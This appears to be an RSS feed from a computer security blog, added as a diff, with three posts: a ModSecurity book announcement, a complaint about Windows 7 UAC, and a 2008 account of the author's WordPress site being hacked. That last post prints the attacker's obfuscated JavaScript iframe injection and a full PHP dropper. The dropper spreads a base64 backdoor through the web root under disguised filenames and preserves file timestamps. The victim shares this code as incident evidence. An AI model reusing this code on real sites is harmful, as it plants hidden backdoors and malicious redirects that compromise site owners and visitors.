@@ -1,0 +1,294 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Injection &#8211; Phocean.net</title>
+	<atom:link href="/blog-archive/tag/injection/feed" rel="self" type="application/rss+xml" />
+	<link>/blog-archive</link>
+	<description>Computer Security Blog</description>
+	<lastBuildDate>Fri, 24 Feb 2017 21:17:51 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.10</generator>
+	<item>
+		<title>New book about ModSecurity</title>
+		<link>/blog-archive/2009/11/15/new-book-about-modsecurity.html</link>
+		<pubDate>Sun, 15 Nov 2009 13:49:48 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Defense]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Apache]]></category>
+		<category><![CDATA[Firewall]]></category>
+		<category><![CDATA[Injection]]></category>
+		<category><![CDATA[mod-security]]></category>
+		<category><![CDATA[ModSecurity]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=520</guid>
+		<description><![CDATA[There will be a new book about mod-security coming out :  ModSecurity 2.5. ModSecurity is essential when it comes to secure any web site. It will make the work of the attacker much harder and  it may save you even if your favorite dynamic pages have a security hole. However, it must be configured wisely...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2009/11/15/new-book-about-modsecurity.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>There will be a new book about mod-security coming out :  <a title="Modsecurity 2.5" href="http://www.packtpub.com/modsecurity-2-5/book" target="_blank">ModSecurity 2.5</a>.</p>
+<p style="text-align: center;"><a href="/blog-archive/wp-content/uploads/2009/11/1847194745.js" /></a></p>
+<p>ModSecurity is essential when it comes to secure any web site.</p>
+<p>It will make the work of the attacker much harder and  it may save you even if your favorite dynamic pages have a security hole.<br />
+However, it must be configured wisely to be efficient. It is just a firewall that works at the application layer : you need to know the attacker point of view and the basics before writing any mod-security rules, otherwise at best it will useless (and at worst, it will kick legitimate traffic off).</p>
+<p>So, stay tuned :  I will talk more about the ModSecurity stuff and publish a review about this book soon.</p>
+<div id="_mcePaste" style="overflow: hidden; position: absolute; left: -10000px; top: 0px; width: 1px; height: 1px;">http://www.packtpub.com/modsecurity-2-5/book</div>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Windows 7 UAC security design flaw</title>
+		<link>/blog-archive/2009/05/15/363.html</link>
+		<comments>/blog-archive/2009/05/15/363.html#comments</comments>
+		<pubDate>Fri, 15 May 2009 14:48:02 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Pentesting]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[System]]></category>
+		<category><![CDATA[Windows]]></category>
+		<category><![CDATA[Injection]]></category>
+		<category><![CDATA[UAC]]></category>
+		<category><![CDATA[Windows 7]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=363</guid>
+		<description><![CDATA[Video of a dummy vulnerability on Windows 7 . More info there. It is incredible that Microsoft invests so much money in its security and that there are still such a bad security design for programs that in no way should be granted any administrator access (calc.exe or notepad.exe). Also, I can&#8217;t imagine that no...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2009/05/15/363.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p><a title="WIndows 7 vulnerability" href="http://leo.lss.com.au/W7E_VID_INT/W7E_VID_INT.htm">Video of a dummy vulnerability</a> on Windows 7 . More <a title="Windows 7 UAC vulnerability" href="http://www.pretentiousname.com/misc/win7_uac_whitelist2.html" target="_blank">info there</a>.</p>
+<p>It is incredible that Microsoft invests so much money in its security and that there are still such a bad security design for programs that in no way should be granted any administrator access (calc.exe or notepad.exe).</p>
+<p>Also, I can&#8217;t imagine that no one could detect it in their teams during the quality process and security audit.</p>
+<p>What the hell are they doing ?</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2009/05/15/363.html/feed</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>Hacked !</title>
+		<link>/blog-archive/2008/06/03/hacked.html</link>
+		<comments>/blog-archive/2008/06/03/hacked.html#comments</comments>
+		<pubDate>Tue, 03 Jun 2008 20:25:25 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Forensic]]></category>
+		<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[News]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[Injection]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Spam]]></category>
+		<category><![CDATA[SQL]]></category>
+		<category><![CDATA[Wordpress]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=109</guid>
+		<description><![CDATA[This blog got hacked yesterday. It looks like some spammer managed to inject some PHP code into almost all *.php files of WordPress. It was not just like the classic SQL injection that is usually used to post some malicious post. The following code was added : &#60;?php echo '&#60;script type=&#34;text/javascript&#34;&#62;function count(str){var res = &#34;&#34;;for(i...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/06/03/hacked.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>This blog got hacked yesterday.</p>
+<p>It looks like some spammer managed to inject some PHP code into almost all *.php files of WordPress.<br />
+It was not just like the classic SQL injection that is usually used to post some malicious post.</p>
+<p>The following code was added :</p>
+<pre>&lt;?php echo '&lt;script type=&quot;text/javascript&quot;&gt;function count(str){var res = &quot;&quot;;for(i = 0; i &lt; str.length; ++i) { n = str.charCodeAt(i); res += String.fromCharCode(n - (2)); } return res; }; document.write(count(&quot;&gt;khtcog\&quot;ute?jvvr&lt;11yyy0yr/uvcvu/rjr0kphq1khtcog1yr/uvcvu0rjr\&quot;ykfvj?3\&quot;jgkijv?3\&quot;htcogdqtfgt?2@&quot;));&lt;/script&gt;';?&gt;</pre>
+<p><span id="more-109"></span></p>
+<p>It make me think that there is a serious vulnerability somewhere on WordPress or a plugin, though my versions were up-to-date.</p>
+<p>Now the blog is back to normal, after a clean reinstallation (erased all the former files).</p>
+<p><a title="Wordpress, hacked" href="http://wordpress.org/support/topic/179428/page/2" target="_blank">I am not the only one to experience this mess</a>.</p>
+<p>For now, the blog is running with a minimal number of plugin &#8211; just akismet, actually &#8211; until the cause of that gets clearer.</p>
+<p>Not a lot of plugins runned before, so it mainly means that the OpenID support for authentication is cut off.</p>
+<p>As my php knowledge is very low, anyone having some tips is welcome. I love WordPress, I would like to avoid looking for another platform or switch to static html !</p>
+<p>&#8212;</p>
+<p><strong>UPDATE 06/13/2008 :</strong><br />
+As C.S Lee suggested in a comment, there were a very suspicious wp-stats.php file in the root of my hacked archive.</p>
+<p>There is the code :</p>
+<pre>
+&lt;?php
+
+@error_reporting(E_ALL);
+@set_time_limit(0);
+mt_srand(crc32(microtime()));
+  
+  
+define('SHCODE', 'PDaWYgKCRjb2RlID0gQGZyZWFkKEBmb3BlbigkSFRUCmVjaG8gIjwvcHJlPiI7Cj8+');
+
+$pres = array('lib_','co_','pre_','net_','func_','ad_','ext_','new_','old_','fix_','fixed_','na_','av_','fx_');  
+$fui = $pres[array_rand($pres)];
+
+global $HTTP_SERVER_VARS;
+$START = time();
+$WD_TIMEOUT = array(8, 7, 6, 6, 5, 5, 5, 5, 0);
+
+function my_fwrite($f, $data) {
+  global $CURFILE;
+  $file_mtime = @filemtime($f);
+  $file_atime = @fileatime($f);
+  $dir_mtime = @filemtime(@dirname($f));
+  $dir_atime = @fileatime(@dirname($f));
+  if ($file_h = @fopen($f, &quot;wb&quot;)) {
+    @fwrite($file_h, $data); @fclose($file_h);
+    if ($file_mtime) {
+      @touch($f, $file_mtime, $file_atime);
+    } elseif (@filemtime($CURFILE)) {
+      @chmod($f, @fileperms($CURFILE));
+      @touch($f, @filemtime($CURFILE), @fileatime($CURFILE));
+      @chgrp($f, @filegroup($CURFILE));
+      @chown($f, @fileowner($CURFILE));
+    };
+    if ($dir_mtime) @touch(@dirname($f), $dir_mtime, $dir_atime);
+    return $f;
+  } else {
+    return '';
+  };
+};
+
+function ext($f) {
+  return substr($f, strrpos($f, &quot;.&quot;) + 1);
+};
+
+function walkdir($p, $func='_walkdir', $l=0) {
+  global $START;
+  global $WD_TIMEOUT;
+  global $FL;
+  $func_f = &quot;{$func}_f&quot;;
+  $func_d = &quot;{$func}_d&quot;;
+  $func_s = &quot;{$func}_s&quot;;
+  $func_e = &quot;{$func}_e&quot;;
+  if ($dh = @opendir(&quot;$p&quot;)) {
+    if (function_exists($func_s)) {
+      if ($func_s($p, $l)) return 1;
+    };
+    while ($f = @readdir($dh)) {
+      if (time() - $START &gt;= $WD_TIMEOUT[$l] ) break;
+      if ($f == '.' || $f == '..' ) continue;
+      if (@is_dir (&quot;$p$f/&quot;) ) walkdir(&quot;$p$f/&quot;, $func, $l+1);
+      if (@is_dir (&quot;$p$f/&quot;) &amp;&amp; function_exists($func_d))
+        $func_d(&quot;$p$f/&quot;, $l);
+      if (@is_file(&quot;$p$f&quot; ) &amp;&amp; function_exists($func_f))
+        $func_f(&quot;$p$f&quot; , $l);
+    };
+    closedir($dh);
+    if (function_exists($func_e)) $func_e($p, $l);
+  };
+};
+
+function r_cut($p) {
+  global $R;
+  return substr($p, strlen($R));
+};
+
+function say($t) {
+  echo &quot;$t\n&quot;;
+};
+
+function testdata($t) {
+  say(md5(&quot;mark_$t&quot;));
+};
+
+$R = $HTTP_SERVER_VARS['DOCUMENT_ROOT'];
+$CURFILE = $HTTP_SERVER_VARS['DOCUMENT_ROOT'] .
+  $HTTP_SERVER_VARS['SCRIPT_NAME'];
+echo &quot;&lt;pre&gt;&quot;;
+testdata('start');
+$fe = ext($CURFILE);
+if (!$fe) $fe = 'php';
+//$FN = &quot;namogofer.$fe&quot;;
+
+function _walkdir_s($d, $l) {
+  global $FCNT;
+  $FCNT = array( 'fn' =&gt; '', 'dir' =&gt; 0, 'file' =&gt; 0, 'simtype' =&gt; 0 );
+};
+
+function _walkdir_d($d,$l) {
+  global $FCNT;
+  $FCNT['dir' ]++;
+};
+
+function _walkdir_f($f,$l) {
+  global $FCNT, $CURFILE;
+  $FCNT['file']++;
+  if (ext($f) == ext($CURFILE)) $FCNT['simtype']++;
+};
+
+function update_passwd($data)
+  {
+  global $FCNT;
+  $password = &quot;&quot;;
+  $possible = &quot;abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*&quot;; 
+  $i = 0;
+  while ($i &lt; 15) 
+    { 
+    $char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
+    if (!strstr($password, $char)) 
+      { 
+      $password .= $char;
+      $i++;
+      }
+    }
+  $FCNT['passwd'] = $password;
+  $md5password = md5($password);
+  return preg_replace(&quot;|define\('PASSWD',\s*'(.*)'|&quot;, &quot;define('PASSWD','$md5password'&quot;, $data);
+  }
+
+function notinf($ar, $tx)
+  {
+  $R = true;
+  foreach ($ar as $ca)
+    {
+    //echo &quot;pass &quot;.substr($tx, 0, strlen($ca)).&quot; in $tx for $ca\n&quot;;
+    if (&quot;$ca&quot; == substr($tx, 0, strlen($ca)))
+      {
+      $R = false;
+      //echo &quot;gotcha\n&quot;;
+      break;
+      }
+    }
+  return $R;
+  }
+
+function _walkdir_e($d,$l) 
+  {
+  global $C, $FCNT, $FN, $fui, $pres;
+  
+    $the_data = base64_decode(SHCODE);
+    $the_dir = opendir(&quot;$d&quot;);
+    $is_php=false;
+    if ($the_dir)
+        while($cfile = readdir($the_dir))
+            {
+            if(
+                $is_php=
+                
+                (('.php' == substr($cfile, -4))and
+                 notinf($pres, $cfile)and
+                ($cfile!='index.php'))
+                 
+              )
+              {
+              $FN = &quot;$fui$cfile&quot;;
+              break;
+              }
+              else
+              {
+              //echo &quot;pass $cfile\n&quot;;
+              }
+            }
+                         
+        if ( $is_php and my_fwrite(&quot;$d$FN&quot;, str_repeat(&quot;\n&quot;,100) . str_repeat('', 150) .
+                    update_passwd($the_data . str_repeat(' ', 150) . &quot;\n&quot; . str_repeat(&quot;\n&quot;, 100))))
+                    {
+                    $FCNT['fn'] = r_cut(&quot;$d$FN&quot;);
+                    say(implode(&quot; &quot;, $FCNT));
+                    }
+
+  };
+
+walkdir(&quot;$R/&quot;);
+testdata('end');
+?&gt;</pre>
+<p>I will try anyway to put a deeper look when I have a little time : now, I have to go to work.</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2008/06/03/hacked.html/feed</wfw:commentRss>
+		<slash:comments>5</slash:comments>
+		</item>
+	</channel>
+</rss>
